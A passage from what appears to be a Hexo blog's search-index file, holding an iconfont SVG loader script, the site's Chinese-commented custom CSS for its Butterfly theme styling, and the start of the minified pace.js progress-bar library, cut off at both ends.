34.976961-11.38884 34.976961-25.294314 0-12.45521-0.469203-45.470049-0.725133-89.276559-142.381822 31.735193-172.453477-70.380469-172.453477-70.380469-23.246882-60.569859-56.816233-76.693384-56.816234-76.693385-46.493765-32.58829 3.540351-31.948468 3.540351-31.948467 51.356415 3.71097 78.356923 54.086324 78.356923 54.086324 45.683323 80.19108 119.817417 57.072162 148.993321 43.593236 4.649376-33.91059 17.915029-57.029508 32.50298-70.167195-113.675122-13.222997-233.151301-58.223843-233.1513-259.341366 0-57.285437 19.919806-104.163095 52.678715-140.846248-5.246544-13.265652-22.820334-66.626844 4.990615-138.884127 0 0 42.996069-14.076094 140.760939 53.787741 40.863327-11.644769 84.627183-17.445825 128.177764-17.6591 43.465272 0.213274 87.271782 6.014331 128.135109 17.6591 97.679561-67.906489 140.59032-53.787741 140.59032-53.787741 27.938914 72.257282 10.407779 125.618474 5.118579 138.884127 32.844219 36.683154 52.593405 83.560812 52.593405 140.846248 0 201.586726-119.646798 245.990404-233.663158 258.957473 18.341577 16.208835 34.721032 48.199958 34.721032 97.210357 0 70.167195-0.639822 126.7275-0.639823 143.960051 0 14.033439 9.213443 30.370239 35.190235 25.209005 203.250265-69.527373 349.769606-266.123484 349.769605-497.867175C1023.857959 234.942803 794.673558 0 512 0" fill="#3E75C3" ></path></symbol><symbol id="icon-bilibili" viewBox="0 0 1129 1024"><path d="M234.909 9.656a80.468 80.468 0 0 1 68.398 0 167.374 167.374 0 0 1 41.843 30.578l160.937 140.82h115.07l160.936-140.82a168.983 168.983 0 0 1 41.843-30.578A80.468 80.468 0 0 1 930.96 76.445a80.468 80.468 0 0 1-17.703 53.914 449.818 449.818 0 0 1-35.406 32.187 232.553 232.553 0 0 1-22.531 18.508h100.585a170.593 170.593 0 0 1 118.289 53.109 171.397 171.397 0 0 1 53.914 118.288v462.693a325.897 325.897 0 0 1-4.024 70.007 178.64 178.64 0 0 1-80.468 112.656 173.007 173.007 0 0 1-92.539 25.75h-738.7a341.186 341.186 0 0 1-72.421-4.024A177.835 177.835 0 0 1 28.91 939.065a172.202 172.202 0 0 1-27.36-92.539V388.662a360.498 360.498 0 0 1 0-66.789A177.03 177.03 0 0 1 162.487 178.64h105.414c-16.899-12.07-31.383-26.555-46.672-39.43a80.468 80.468 0 0 1-25.75-65.984 80.468 80.468 0 0 1 39.43-63.57M216.4 321.873a80.468 80.468 0 0 0-63.57 57.937 108.632 108.632 0 0 0 0 30.578v380.615a80.468 80.468 0 0 0 55.523 80.469 106.218 106.218 0 0 0 34.601 5.632h654.208a80.468 80.468 0 0 0 76.444-47.476 112.656 112.656 0 0 0 8.047-53.109v-354.06a135.187 135.187 0 0 0 0-38.625 80.468 80.468 0 0 0-52.304-54.719 129.554 129.554 0 0 0-49.89-7.242H254.22a268.764 268.764 0 0 0-37.82 0z m0 0" fill="#e14091" ></path><path d="M348.369 447.404a80.468 80.468 0 0 1 55.523 18.507 80.468 80.468 0 0 1 28.164 59.547v80.468a80.468 80.468 0 0 1-16.094 51.5 80.468 80.468 0 0 1-131.968-9.656 104.609 104.609 0 0 1-10.46-54.719v-80.468a80.468 80.468 0 0 1 70.007-67.593z m416.02 0a80.468 80.468 0 0 1 86.102 75.64v80.468a94.148 94.148 0 0 1-12.07 53.11 80.468 80.468 0 0 1-132.773 0 95.757 95.757 0 0 1-12.875-57.133V519.02a80.468 80.468 0 0 1 70.007-70.812z m0 0" fill="#e14091" ></path></symbol></svg>',d=(d=document.getElementsByTagName("script"))[d.length-1].getAttribute("data-injectcss"),o=function(a,l){l.parentNode.insertBefore(a,l)};if(d&&!a.__iconfont__svg__cssinject__){a.__iconfont__svg__cssinject__=!0;try{document.write("<style>.svgfont {display: inline-block;width: 1em;height: 1em;fill: currentColor;vertical-align: -0.1em;font-size:16px;}</style>")}catch(a){console&&console.log(a)}}function v(){i||(i=!0,t())}function e(){try{h.documentElement.doScroll("left")}catch(a){return void setTimeout(e,50)}v()}l=function(){var a,l=document.createElement("div");l.innerHTML=p,p=null,(l=l.getElementsByTagName("svg")[0])&&(l.setAttribute("aria-hidden","true"),l.style.position="absolute",l.style.width=0,l.style.height=0,l.style.overflow="hidden",l=l,(a=document.body).firstChild?o(l,a.firstChild):a.appendChild(l))},document.addEventListener?~["complete","loaded","interactive"].indexOf(document.readyState)?setTimeout(l,0):(c=function(){document.removeEventListener("DOMContentLoaded",c,!1),l()},document.addEventListener("DOMContentLoaded",c,!1)):document.attachEvent&&(t=l,h=a.document,i=!1,e(),h.onreadystatechange=function(){"complete"==h.readyState&&(h.onreadystatechange=null,v())})}(window);]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/css/custom.css"/>
      <url>/css/custom.css</url>
      
        <content type="html"><![CDATA[/* @font-face {  font-family: Candyhome;  src: url(https://cdn.cbd.int/anzhiyu-blog@latest/fonts/Candyhome.ttf);  font-display: swap;  font-weight: lighter;} */@font-face {    font-family: ZhuZiAYuanJWD;    src: url(https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/beijin.jpg);    font-display: swap;    font-weight: lighter;  }    div#menus {    font-family: 'ZhuZiAYuanJWD';  }  h1#site-title {    font-family: ZhuZiAYuanJWD;    font-size: 3em !important;  }  a.article-title,  a.blog-slider__title,  a.categoryBar-list-link,  h1.post-title {    font-family: ZhuZiAYuanJWD;  }    .iconfont {    font-family: 'iconfont' !important;    font-size: 3em;    /* 可以定义图标大小 */    font-style: normal;    -webkit-font-smoothing: antialiased;    -moz-osx-font-smoothing: grayscale;  }    /* 时间轴生肖icon */  svg.icon {    /* 这里定义svg.icon，避免和Butterfly自带的note标签冲突 */    width: 1em;    height: 1em;    /* width和height定义图标的默认宽度和高度*/    vertical-align: -0.15em;    fill: currentColor;    overflow: hidden;  }    .icon-zhongbiao::before {    color: #f7c768;  }    /* bilibli番剧插件 */  .bangumi-active {    background: #dbecfe !important;    border-radius: 10px !important;  }  a.bangumi-tab:hover {    text-decoration: none !important;  }  .bangumi-button:hover {    background: #dbecfe !important;    border-radius: 10px !important;  }  a.bangumi-button.bangumi-nextpage:hover {    text-decoration: none !important;  }  .bangumi-button {    padding: 5px 10px !important;  }    a.bangumi-tab {    padding: 5px 10px !important;  }  svg.icon.faa-tada {    font-size: 1.1em;  }    /* 解决artitalk的图标问题 */  #uploadSource > svg {    width: 1.19em;    height: 1.5em;  }    /*top-img黑色透明玻璃效果移除，不建议加，除非你执着于完全一图流或者背景图对比色明显 */  #page-header:not(.not-top-img):before {    background-color: transparent !important;  }    /* 首页文章卡片 */  #recent-posts > .recent-post-item {    background: rgba(255, 255, 255, 0.9);  }    /* 首页侧栏卡片 */  #aside-content .card-widget {    background: rgba(255, 255, 255, 0.9);  }    /* 文章页面正文背景 */  div#post {    background: rgba(255, 255, 255, 0.9);  }    /* 分页页面 */  div#page {    background: rgba(255, 255, 255, 0.9);  }    /* 归档页面 */  div#archive {    background: rgba(255, 255, 255, 0.9);  }    /* 标签页面 */  div#tag {    background: rgba(255, 255, 255, 0.9);  }    /* 分类页面 */  div#category {    background: rgba(255, 255, 255, 0.9);  }    /*夜间模式伪类遮罩层透明*/  [data-theme='dark'] #recent-posts > .recent-post-item {    background: #121212;  }    [data-theme='dark'] .card-widget {    background: #121212 !important;  }    [data-theme='dark'] div#post {    background: #121212 !important;  }    [data-theme='dark'] div#tag {    background: #121212 !important;  }    [data-theme='dark'] div#archive {    background: #121212 !important;  }    [data-theme='dark'] div#page {    background: #121212 !important;  }    [data-theme='dark'] div#category {    background: #121212 !important;  }    [data-theme='dark'] div#category {    background: transparent !important;  }  /* 页脚透明 */  #footer {    background: transparent !important;  }    /* 头图透明 */  #page-header {    background: transparent !important;  }    #rightside > div > button {    border-radius: 5px;  }    /* 滚动条 */    ::-webkit-scrollbar {    width: 10px;    height: 10px;  }    ::-webkit-scrollbar-thumb {    background-color: #49b1f5;    border-radius: 2em;  }    ::-webkit-scrollbar-corner {    background-color: transparent;  }    ::-moz-selection {    color: #fff;    background-color: #49b1f5;  }    /* 音乐播放器 */    /* .aplayer .aplayer-lrc {    display: none !important;  } */    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {    left: -66px !important;    transition: all 0.3s;    /* 默认情况下缩进左侧66px，只留一点箭头部分 */  }    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {    left: 0 !important;    transition: all 0.3s;    /* 鼠标悬停是左侧缩进归零，完全显示按钮 */  }    .aplayer.aplayer-fixed {    z-index: 999999 !important;  }    /* 评论框  */  .vwrap {    box-shadow: 2px 2px 5px #bbb;    background: rgba(255, 255, 255, 0.3);    border-radius: 8px;    padding: 30px;    margin: 30px 0px 30px 0px;  }    /* 设置评论框 */    .vcard {    box-shadow: 2px 2px 5px #bbb;    background: rgba(255, 255, 255, 0.3);    border-radius: 8px;    padding: 30px;    margin: 30px 0px 0px 0px;  }     /* md网站下划线 */  #article-container a:hover {    text-decoration: none !important;  }    #article-container #hpp_talk p img {    display: inline;  }    /* 404页面 */  #error-wrap {    position: absolute;    top: 40%;    right: 0;    left: 0;    margin: 0 auto;    padding: 0 1rem;    max-width: 1000px;    transform: translate(0, -50%);  }    #error-wrap .error-content {    display: flex;    flex-direction: row;    justify-content: center;    align-items: center;    margin: 0 1rem;    height: 18rem;    border-radius: 8px;    background: var(--card-bg);    box-shadow: var(--card-box-shadow);    transition: all 0.3s;  }    #error-wrap .error-content .error-img {    box-flex: 1;    flex: 1;    height: 100%;    border-top-left-radius: 8px;    border-bottom-left-radius: 8px;    background-color: #49b1f5;    background-position: center;    background-size: cover;  }    #error-wrap .error-content .error-info {    box-flex: 1;    flex: 1;    padding: 0.5rem;    text-align: center;    font-size: 14px;    font-family: Titillium Web, 'PingFang SC', 'Hiragino Sans GB', 'Microsoft JhengHei', 'Microsoft YaHei', sans-serif;  }  #error-wrap .error-content .error-info .error_title {    margin-top: -4rem;    font-size: 9em;  }  #error-wrap .error-content .error-info .error_subtitle {    margin-top: -3.5rem;    word-break: break-word;    font-size: 1.6em;  }  #error-wrap .error-content .error-info a {    display: inline-block;    margin-top: 0.5rem;    padding: 0.3rem 1.5rem;    background: var(--btn-bg);    color: var(--btn-color);  }    #body-wrap.error .aside-list {    display: flex;    flex-direction: row;    flex-wrap: nowrap;    bottom: 0px;    position: absolute;    padding: 1rem;    width: 100%;    overflow: scroll;  }    #body-wrap.error .aside-list .aside-list-group {    display: flex;    flex-direction: row;    flex-wrap: nowrap;    max-width: 1200px;    margin: 0 auto;  }    #body-wrap.error .aside-list .aside-list-item {    padding: 0.5rem;  }    #body-wrap.error .aside-list .aside-list-item img {    width: 100%;    object-fit: cover;    border-radius: 12px;  }    #body-wrap.error .aside-list .aside-list-item .thumbnail {    overflow: hidden;    width: 230px;    height: 143px;    background: var(--heo-card-bg);    display: flex;  }    #body-wrap.error .aside-list .aside-list-item .content .title {    -webkit-line-clamp: 2;    overflow: hidden;    display: -webkit-box;    -webkit-box-orient: vertical;    line-height: 1.5;    justify-content: center;    align-items: flex-end;    align-content: center;    padding-top: 0.5rem;    color: white;  }    #body-wrap.error .aside-list .aside-list-item .content time {    display: none;  }    /* 代码框主题 */  #article-container figure.highlight {    border-radius: 10px;  }    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {    left: -66px !important;    /* 默认情况下缩进左侧66px，只留一点箭头部分 */  }    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {    left: 0 !important;    /* 鼠标悬停是左侧缩进归零，完全显示按钮 */  }/* 标签 */#aside-content .card-tag-cloud a {  border: 1px solid;  line-height: 1.5;  border-radius: 6px;  margin: 3px;  padding: 0 5px;}.tag-cloud-list a {  border: 1px solid;  line-height: 1.5;  border-radius: 6px;  padding: 5px 15px;  font-size: 1.2rem;  margin: 5px;}    /* 文章页H1-H6图标样式效果 */h1::before, h2::before, h3::before, h4::before, h5::before, h6::before {  -webkit-animation: ccc 1.6s linear infinite ;  animation: ccc 1.6s linear infinite ;}@-webkit-keyframes ccc {  0% {      -webkit-transform: rotate(0deg);      transform: rotate(0deg)  }  to {      -webkit-transform: rotate(-1turn);      transform: rotate(-1turn)  }}@keyframes ccc {  0% {      -webkit-transform: rotate(0deg);      transform: rotate(0deg)  }  to {      -webkit-transform: rotate(-1turn);      transform: rotate(-1turn)  }}#content-inner.layout h1::before {  color: #f07d35 ;  margin-left: -1.55rem;  font-size: 1.3rem;  margin-top: -0.23rem;}#content-inner.layout h2::before {  color: #fb7061 ;  margin-left: -1.35rem;  font-size: 1.1rem;  margin-top: -0.12rem;}#content-inner.layout h3::before {  color: #ffbf00 ;  margin-left: -1.22rem;  font-size: 0.95rem;  margin-top: -0.09rem;}#content-inner.layout h4::before {  color: #a9e000 ;  margin-left: -1.05rem;  font-size: 0.8rem;  margin-top: -0.09rem;}#content-inner.layout h5::before {  color: #57c850 ;  margin-left: -0.9rem;  font-size: 0.7rem;  margin-top: 0.0rem;}#content-inner.layout h6::before {  color: #5ec1e0 ;  margin-left: -0.9rem;  font-size: 0.66rem;  margin-top: 0.0rem;}#content-inner.layout h1:hover, #content-inner.layout h2:hover, #content-inner.layout h3:hover, #content-inner.layout h4:hover, #content-inner.layout h5:hover, #content-inner.layout h6:hover {  color: #49b1f5 ;}#content-inner.layout h1:hover::before, #content-inner.layout h2:hover::before, #content-inner.layout h3:hover::before, #content-inner.layout h4:hover::before, #content-inner.layout h5:hover::before, #content-inner.layout h6:hover::before {  color: #49b1f5 ;  -webkit-animation: ccc 3.2s linear infinite ;  animation: ccc 3.2s linear infinite ;}/* 页面设置icon转动速度调整 */#rightside_config i.fas.fa-cog.fa-spin {  animation: fa-spin 5s linear infinite ;}/* 主页所有文章页面背景 */#aside_content .card-widget, #recent-posts>.recent-post-item, .layout_page>div:first-child:not(.recent-posts), .layout_post>#page, .layout_post>#post, .read-mode .layout_post>#post{  /* 以下代表透明度为0.8 */  background: rgba(255,255,255,.8);}/*侧边栏页面*/#aside-content>.card-widget  {background: rgba(255,255,255,.8);}#aside-content>.sticky_layout>.card-widget{background: rgba(255,255,255,.8);}/*文章页面*/.layout>#post{background: rgba(255,255,255,.8);}/*分类页面*/.layout>#page{background: rgba(255,255,255,.8);}/*时间轴页面*/.layout>#archive{background: rgba(255,255,255,.8);}/*页面显示%比*/button#go-up #percent {display:none;font-weight:700;font-size:15px!important}button#go-up span {font-size:12px!important;margin-right:-1px}button#go-up:hover i {display:block!important}button#go-up:hover #percent {display:none!important}#rightside>div>a,#rightside>div>button {display:flex;align-items:center;justify-content:center;width:38px;height:38px;font-size:18px}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {  left: -66px !important;  /* 默认情况下缩进左侧66px，只留一点箭头部分 */}.aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {  left: 0 !important;  /* 鼠标悬停是左侧缩进归零，完全显示按钮 */}@font-face {  font-family: 'iconfont';  src: url('/fonts/iconfont.eot');  src: url('/fonts/iconfont.eot?#iefix') format('embedded-opentype'),  url('/fonts/iconfont.woff2') format('woff2'),  url('/fonts/iconfont.woff') format('woff'),  url('/fonts/iconfont.ttf') format('truetype'),  url('/fonts/iconfont.svg#iconfont') format('svg');  }  .iconfont {    font-family: "iconfont" !important;    font-size: 16px;    font-style: normal;    -webkit-font-smoothing: antialiased;    -moz-osx-font-smoothing: grayscale;  }    .icon-bilibili-fill:before {    content: "\e66b";  }    .icon-icon_bilibili:before {    content: "\e601";  }    .icon-bilibili-line:before {    content: "\e66d";  }    .icon-yun:before {    content: "\eb2c";  }    .icon-yun1:before {    content: "\e60b";  }    .icon-kafei:before {    content: "\e660";  }    .icon-xinxi:before {    content: "\e641";  }    .icon-home:before {    content: "\e699";  }    .icon-folder:before {    content: "\e650";  }    .icon-tags:before {    content: "\e685";  }    .icon-aixin:before {    content: "\e602";  }    .icon-qq:before {    content: "\e600";  }    .icon-QQ1:before {    content: "\e667";  }    .icon-shijianzhou:before {    content: "\e61b";  }    .icon-QQ:before {    content: "\e65e";  }    .icon-email:before {    content: "\e6eb";  }    .icon-github:before {    content: "\ea0b";  }    .icon-bilibili:before {    content: "\e609";  }    /* 标签 */#aside-content .card-tag-cloud a {    border: 1px solid;    line-height: 1.5;    border-radius: 6px;    margin: 3px;    padding: 0 5px;}.tag-cloud-list a {    border: 1px solid;    line-height: 1.5;    border-radius: 6px;    padding: 5px 15px;    font-size: 1.2rem;    margin: 5px;}#nav-right{  flex:1 1 auto;  justify-content: flex-end;  margin-left: auto;  display: flex;  flex-wrap:nowrap;}#nav-right{  flex:1 1 auto;  justify-content: flex-end;  margin-left: auto;  display: flex;  flex-wrap:nowrap;}/* 设置文字内容 :nth-child(1)的作用是选择第几个 */.el-input.el-input--small.el-input-group.el-input-group--prepend:nth-child(1):before {  content: '输入QQ号会自动获取昵称和头像🐧';}.el-input.el-input--small.el-input-group.el-input-group--prepend:nth-child(2):before {  content: '收到回复将会发送到您的邮箱📧';}.el-input.el-input--small.el-input-group.el-input-group--prepend:nth-child(3):before {  content: '可以通过昵称访问您的网站🔗';}/* 当用户点击输入框时显示 */.el-input.el-input--small.el-input-group.el-input-group--prepend:focus-within::before,.el-input.el-input--small.el-input-group.el-input-group--prepend:focus-within::after {  display: block;}/* 主内容区 */.el-input.el-input--small.el-input-group.el-input-group--prepend::before {  /* 先隐藏起来 */  display: none;  /* 绝对定位 */  position: absolute;  /* 向上移动60像素 */  top: -60px;  /* 文字强制不换行，防止left:50%导致的文字换行 */  white-space: nowrap;  /* 圆角 */  border-radius: 10px;  /* 距离左边50% */  left: 50%;  /* 然后再向左边挪动自身的一半，即可实现居中 */  transform: translate(-50%);  /* 填充 */  padding: 14px 18px;  background: #444;  color: #fff;}/* 小角标 */.el-input.el-input--small.el-input-group.el-input-group--prepend::after {  display: none;  content: '';  position: absolute;  /* 内容大小（宽高）为0且边框大小不为0的情况下，每一条边（4个边）都是一个三角形，组成一个正方形。  我们先将所有边框透明，再给其中的一条边添加颜色就可以实现小三角图标 */  border: 12px solid transparent;  border-top-color: #444;  left: 50%;  transform: translate(-50%, -48px);}/* 返回顶部 */button#go-up #percent {  display: none;  font-weight: bold;  font-size: 15px !important;}button#go-up span {  font-size: 12px !important;  margin-right: -1px;}/* 鼠标滑动到按钮上时显示返回顶部图标 */button#go-up:hover i {  display: block !important;}button#go-up:hover #percent {  display: none !important;}/*子菜单居中*/.menus_item_child li:not(#sidebar-menus li){  float: left;  border-radius: 6px!important;  -webkit-border-radius: 6px!important;  -moz-border-radius: 6px!important;  -ms-border-radius: 6px!important;  -o-border-radius: 6px!important;}.menus_item_child:not(#sidebar-menus ul){/*  left:calc(-150%)!important;这是估算值，为了保持元素居中的，如果不合适可以自己调改为：*/left:50%;translate:-50%;}/*居中代码*/#nav .menus_items {  position: absolute;  width: fit-content;  left: 50%;  transform: translateX(-50%);}#nav .menus_items .menus_item:hover .menus_item_child{  display: flex;}/* 这里的2是代表导航栏的第二个元素，即有子菜单的元素，可以按自己需求修改 */.menus_items .menus_item:nth-child(2) .menus_item_child {  left: -65px;}/*顶部加载进度条*/.pace {  pointer-events: none;  user-select: none;  z-index: 2;  position: fixed;  margin: auto;  top: 4px;  left: 0;  right: 0;  height: 8px;  border-radius: 8px;  width: 6rem;  background: #eaecf2;  overflow: hidden;}.pace-inactive .pace-progress {  opacity: 0;  transition: 0.3s ease-in;}.pace.pace-inactive {  opacity: 0;  transition: 0.3s;  top: -8px;}.pace .pace-progress {  box-sizing: border-box;  transform: translate3d(0, 0, 0);  position: fixed;  z-index: 2;  display: block;  position: absolute;  top: 0;  right: 100%;  height: 100%;  width: 100%;  background: #49b1f5;  background: linear-gradient(    to right,    rgb(18, 194, 233),    rgb(196, 113, 237),    rgb(246, 79, 89)  );  animation: gradient 2s ease infinite;  background-size: 200%;}​#nav-right {  flex: 1 1 auto;  justify-content: flex-end;  margin-left: auto;  display: flex;  flex-wrap: nowrap;}/*白天主题下的配置*/#aside-content>.card-widget.card-info {  /*换成自己图片的地址*/  background-image: url('https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/bg.jpg');  background-repeat: no-repeat;  background-attachment: inherit;  background-size: 100%}/*黑暗主题下的配置*/[data-theme=dark] #aside-content>.card-widget.card-info {  /*换成自己图片的地址*/  background-image: url('https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/bbg.png') !important}.nav-fixed #nav{  transform: translateY(58px)!important;  -webkit-transform: translateY(58px)!important;  -moz-transform: translateY(58px)!important;  -ms-transform: translateY(58px)!important;  -o-transform: translateY(58px)!important;}#nav{  transition: none!important;  -webkit-transition: none!important;  -moz-transition: none!important;  -ms-transition: none!important;  -o-transition: none!important;}/* 归档样式 */span.card-archive-list-count {  width: auto;  text-align: left;  font-size: 1.5rem;  line-height: 0.9;  font-weight: 700;}.card-archive-list-count-group {  display: flex;  flex-direction: row;  align-items: baseline;}#aside-content .card-archives ul.card-archive-list > .card-archive-list-item a span:last-child,#aside-content .card-categories ul.card-category-list > .card-category-list-item a span:last-child {  width: fit-content;  margin-left: 4px;}span.card-archive-list-count {  width: auto;  text-align: left;  font-size: 1.1rem;  line-height: 0.9;  font-weight: 700;}.card-archive-list-date {  font-size: 14px;  opacity: 0.6;}li.card-archive-list-item {  width: 100%;  flex: 0 0 48%;}#aside-content .card-archives ul.card-archive-list > .card-archive-list-item a:hover,#aside-content .card-categories ul.card-category-list > .card-category-list-item a:hover {  color: black;  background-color: skyblue;  box-shadow: var(--anzhiyu-shadow-theme);  border-radius: 8px;  padding-left: 0.5rem;  padding-right: 0.5rem;}@media screen and (min-width: 1300px) {  #aside-content .card-archives ul.card-archive-list > .card-archive-list-item a:hover,  #aside-content .card-categories ul.card-category-list > .card-category-list-item a:hover {    transform: scale(1.03);  }  #aside-content .card-archives ul.card-archive-list > .card-archive-list-item a:active,  #aside-content .card-categories ul.card-category-list > .card-category-list-item a:active {    transform: scale(0.97);  }}#aside-content .card-archives ul.card-archive-list > .card-archive-list-item a,#aside-content .card-categories ul.card-category-list > .card-category-list-item a {  border-radius: 8px;  margin: 4px 0;  display: flex;  flex-direction: column;  align-content: space-between;  border: var(--style-border);}#aside-content .card-archives ul.card-archive-list > .card-archive-list-item a span:first-child,#aside-content .card-categories ul.card-category-list > .card-category-list-item a span:first-child {  width: auto;  flex: inherit;}#aside-content .card-archives ul.card-archive-list,#aside-content .card-categories ul.card-category-list {  display: flex;  flex-direction: row;  justify-content: space-between;  flex-wrap: wrap;}/*表情包放大*/#owo-big {  position: fixed;  align-items: center;  background-color: rgb(255, 255, 255);  border: 1px #aaa solid;  border-radius: 10px;  z-index: 9999;  display: none;  transform: translate(0, -105%);  overflow: hidden;  animation: owoIn 0.3s cubic-bezier(0.42, 0, 0.3, 1.11);}[data-theme=dark] #owo-big {  background-color: #4a4a4a}#owo-big img {  width: 100%;}/* 动画效果代码由 Heo：https://blog.zhheo.com/ 提供 */@keyframes owoIn {  0% {      transform: translate(0, -95%);      opacity: 0;  }  100% {      transform: translate(0, -105%);      opacity: 1;  }}/*回到主页按钮*/#site-name::before{  opacity: 0;  background-color: var(--lyx-theme)!important;  border-radius: 8px;  -webkit-border-radius: 8px;  -moz-border-radius: 8px;  -ms-border-radius: 8px;  -o-border-radius: 8px;  transition: .3s;  -webkit-transition: .3s;  -moz-transition: .3s;  -ms-transition: .3s;  -o-transition: .3s;  position:absolute;  top:0!important;  right:0!important;  width:100%;  height:100%;  content: "\f015";  box-shadow: 0 0 5px var(--lyx-theme);  font-family: "Font Awesome 6 Free";  text-align: center;  color:white;  line-height:34px;/*如果有溢出或者垂直不居中的现象微调一下这个参数*/  font-size: 18px;/*根据个人喜好*/}#site-name:hover::before{  opacity: 1;  scale:1.03;}#site-name{  position: relative;  font-size: 24px; /*一定要把字体调大点，否则效果惨不忍睹！*/}:root{  --lyx-theme:#87CEEB /*我的主题色*/}/*关闭蓝色的条*/#nav *::after{  background-color: transparent!important;}#recent-posts>.recent-post-item {  position: relative;}/* 最新文章图标 */.newPost-left,.newPost-right {  position: absolute;  top: 0;  color: white;  padding: 0 15px;  background-color: #49b1f5;  border-radius: 0 0 10px 10px;}.newPost-left {  left: 15px;}.newPost-right {  right: 15px;}]]></content>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/js/pace.min.js"/>
      <url>/js/pace.min.js</url>
      
        <content type="html"><![CDATA[/*! pace 1.0.2 */(function(){var a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X=[].slice,Y={}.hasOwnProperty,Z=function(a,b){function c(){this.constructor=a}for(var d in b)Y.call(b,d)&&(a[d]=b[d]);return c.prototype=b.prototype,a.prototype=new c,a.__super__=b.prototype,a},$=[].indexOf||function(a){for(var b=0,c=this.length;c>b;b++)if(b in this&&this[b]===a)return b;return-1};for(u={catchupTime:100,initialRate:.03,minTime:250,ghostTime:100,maxProgressPerFrame:20,easeFactor:1.25,startOnPageLoad:!0,restartOnPushState:!0,restartOnRequestAfter:500,target:"body",elements:{checkInterval:100,selectors:["body"]},eventLag:{minSamples:10,sampleCount:3,lagThreshold:3},ajax:{trackMethods:["GET"],trackWebSockets:!0,ignoreURLs:[]}},C=function(){var a;return null!=(a="undefined"!=typeof performance&&null!==performance&&"function"==typeof performance.now?performance.now():void 0)?a:+new Date},E=window.requestAnimationFrame||window.mozRequestAnimationFrame||window.webkitRequestAnimationFrame||window.msRequestAnimationFrame,t=window.cancelAnimationFrame||window.mozCancelAnimationFrame,null==E&&(E=function(a){return setTimeout(a,50)},t=function(a){return clearTimeout(a)}),G=function(a){var b,c;return b=C(),(c=function(){var d;return d=C()-b,d>=33?(b=C(),a(d,function(){return E(c)})):setTimeout(c,33-d)})()},F=function(){var a,b,c;return c=arguments[0],b=arguments[1],a=3<=arguments.length?X.call(arguments,2):[],"function"==typeof c[b]?c[b].apply(c,a):c[b]},v=function(){var a,b,c,d,e,f,g;for(b=arguments[0],d=2<=arguments.length?X.call(arguments,1):[],f=0,g=d.length;g>f;f++)if(c=d[f])for(a in c)Y.call(c,a)&&(e=c[a],null!=b[a]&&"object"==typeof b[a]&&null!=e&&"object"==typeof e?v(b[a],e):b[a]=e);return b},q=function(a){var b,c,d,e,f;for(c=b=0,e=0,f=a.length;f>e;e++)d=a[e],c+=Math.abs(d),b++;return c/b},x=function(a,b){var c,d,e;if(null==a&&(a="options"),null==b&&(b=!0),e=document.querySelector("[data-pace-"+a+"]")){if(c=e.getAttribute("data-pace-"+a),!b)return c;try{return JSON.parse(c)}catch(f){return d=f,"undefined"!=typeof console&&null!==console?console.error("Error parsing inline pace options",d):void 0}}},g=function(){function a(){}return a.prototype.on=function(a,b,c,d){var e;return null==d&&(d=!1),null==this.bindings&&(this.bindings={}),null==(e=this.bindings)[a]&&(e[a]=[]),this.bindings[a].push({handler:b,ctx:c,once:d})},a.prototype.once=function(a,b,c){return this.on(a,b,c,!0)},a.prototype.off=function(a,b){var c,d,e;if(null!=(null!=(d=this.bindings)?d[a]:void 0)){if(null==b)return delete this.bindings[a];for(c=0,e=[];c<this.bindings[a].length;)e.push(this.bindings[a][c].handler===b?this.bindings[a].splice(c,1):c++);return e}},a.prototype.trigger=function(){var a,b,c,d,e,f,g,h,i;if(c=arguments[0],a=2<=arguments.length?X.call(arguments,1):[],null!=(g=this.bindings)?g[c]:void 0){for(e=0,i=[];e<this.bindings[c].length;)h=this.bindings[c][e],d=h.handler,b=h.ctx,f=h.once,d.apply(null!=b?b:this,a),i.push(f?this.bindings[c].splice(e,1):e++);return i}},a}(),j=window.Pace||{},window.Pace=j,v(j,g.prototype),D=j.options=v({},u,window.paceOptions,x()),U=["ajax","document","eventLag","elements"],Q=0,S=U.length;S>Q;Q++)K=U[Q],D[K]===!0&&(D[K]=u[K]);i=function(a){function b(){return V=b.__super__.constructor.apply(this,arguments)}return Z(b,a),b}(Error),b=function(){function a(){this.progress=0}return a.prototype.getElement=function(){var a;if(null==this.el){if(a=document.querySelector(D.target),!a)throw new i;this.el=document.createElement("div"),this.el.className="pace pace-active",document.body.className=document.body.className.replace(/pace-done/g,""),document.body.className+=" pace-running",this.el.innerHTML='<div class="pace-progress">\n  <div class="pace-progress-inner"></div>\n</div>\n<div class="pace-activity"></div>',null!=a.firstChild?a.insertBefore(this.el,a.firstChild):a.appendChild(this.el)}return this.el},a.prototype.finish=function(){var a;return a=this.getElement(),a.className=a.className.replace("pace-active",""),a.className+=" pace-inactive",document.body.className=document.body.className.replace("pace-running",""),document.body.className+=" pace-done"},a.prototype.update=function(a){return this.progress=a,this.render()},a.prototype.destroy=function(){try{this.getElement().parentNode.removeChild(this.getElement())}catch(a){i=a}return this.el=void 0},a.prototype.render=function(){var a,b,c,d,e,f,g;if(null==document.querySelector(D.target))return!1;for(a=this.getElement(),d="translate3d("+this.progress+"%, 0, 0)",g=["webkitTransform","msTransform","transform"],e=0,f=g.length;f>e;e++)b=g[e],a.children[0].style[b]=d;return(!this.lastRenderedProgress||this.lastRenderedProgress|0!==this.progress|0)&&(a.children[0].setAttribute("data-progress-text",""+(0|this.progress)+"%"),this.progress>=100?c="99":(c=this.progress<10?"0":"",c+=0|this.progress),a.children[0].setAttribute("data-progress",""+c)),this.lastRenderedProgress=this.progress},a.prototype.done=function(){return this.progress>=100},a}(),h=function(){function a(){this.bindings={}}return a.prototype.trigger=function(a,b){var c,d,e,f,g;if(null!=this.bindings[a]){for(f=this.bindings[a],g=[],d=0,e=f.length;e>d;d++)c=f[d],g.push(c.call(this,b));return g}},a.prototype.on=function(a,b){var c;return 